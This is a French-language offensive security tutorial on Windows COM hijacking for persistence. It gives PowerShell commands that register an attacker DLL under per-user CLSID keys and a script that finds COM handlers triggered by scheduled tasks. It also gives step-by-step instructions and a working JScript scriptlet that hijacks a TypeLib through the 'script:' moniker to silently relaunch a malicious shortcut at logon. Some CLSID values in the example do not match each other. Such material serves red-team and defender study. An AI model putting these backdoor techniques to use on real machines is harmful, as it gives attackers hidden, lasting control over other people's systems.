# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching not existent COM components

Comme les valeurs de HKCU peuvent être modifiées par les utilisateurs, COM Hijacking peut être utilisé comme mécanisme persistant. En utilisant `procmon`, il est facile de trouver des entrées du registre COM recherchées qui n'existent pas et que un attaquant pourrait créer pour assurer une persistance. Filtres :

- **RegOpenKey** opérations.
- où le _Result_ est **NAME NOT FOUND**.
- et le _Path_ se termine par **InprocServer32**.

Une fois que vous avez décidé quel COM inexistant usurper, exécutez les commandes suivantes. _Faites attention si vous décidez d'usurper un COM qui est chargé toutes les quelques secondes car cela pourrait être excessif._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Composants COM du Planificateur de tâches susceptibles d'être détournés

Les tâches Windows utilisent des Custom Triggers pour appeler des objets COM et, comme elles sont exécutées via le Planificateur de tâches, il est plus facile de prévoir quand elles seront déclenchées.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

En vérifiant la sortie, vous pouvez en sélectionner une qui sera exécutée, par exemple, **à chaque connexion d'un utilisateur**.

En recherchant maintenant le CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** dans **HKEY\CLASSES\ROOT\CLSID** et dans HKLM et HKCU, vous trouverez généralement que la valeur n'existe pas dans HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ensuite, il vous suffit de créer l'entrée HKCU et à chaque connexion de l'utilisateur, votre backdoor sera déclenchée.

---

## COM TypeLib Hijacking (script: moniker persistence)

Les Type Libraries (TypeLib) définissent les interfaces COM et sont chargées via `LoadTypeLib()`. Lorsqu'un serveur COM est instancié, l'OS peut aussi charger le TypeLib associé en consultant les clés du registre sous `HKCR\TypeLib\{LIBID}`. Si le chemin du TypeLib est remplacé par un **moniker**, p.ex. `script:C:\...\evil.sct`, Windows exécutera le scriptlet lorsque le TypeLib sera résolu — générant une stealthy persistence qui se déclenche lorsque des composants courants sont sollicités.

Cela a été observé contre le Microsoft Web Browser control (souvent chargé par Internet Explorer, des apps intégrant WebBrowser, et même `explorer.exe`).

### Étapes (PowerShell)

1) Identifiez le TypeLib (LIBID) utilisé par un CLSID fréquemment sollicité. Exemple de CLSID souvent abusé par des malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}`
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Pointez le chemin TypeLib par utilisateur vers un scriptlet local en utilisant le moniker `script:` (aucun droit d'administration requis) :
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Déposez un `.sct` JScript minimal qui relance votre payload principal (par ex. un `.lnk` utilisé par la chaîne initiale) :
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Déclenchement – ouvrir IE, une application qui intègre le WebBrowser control, ou même une activité routinière d'Explorer chargera le TypeLib et exécutera le scriptlet, re-arming your chain on logon/reboot.

Nettoyage
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Remarques
- Vous pouvez appliquer la même logique à d'autres composants COM fréquemment utilisés ; résolvez toujours d'abord le véritable `LIBID` depuis `HKCR\CLSID\{CLSID}\TypeLib`.
- Sur les systèmes 64 bits, vous pouvez également remplir la sous-clé `win64` pour les consommateurs 64 bits.

## Références

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
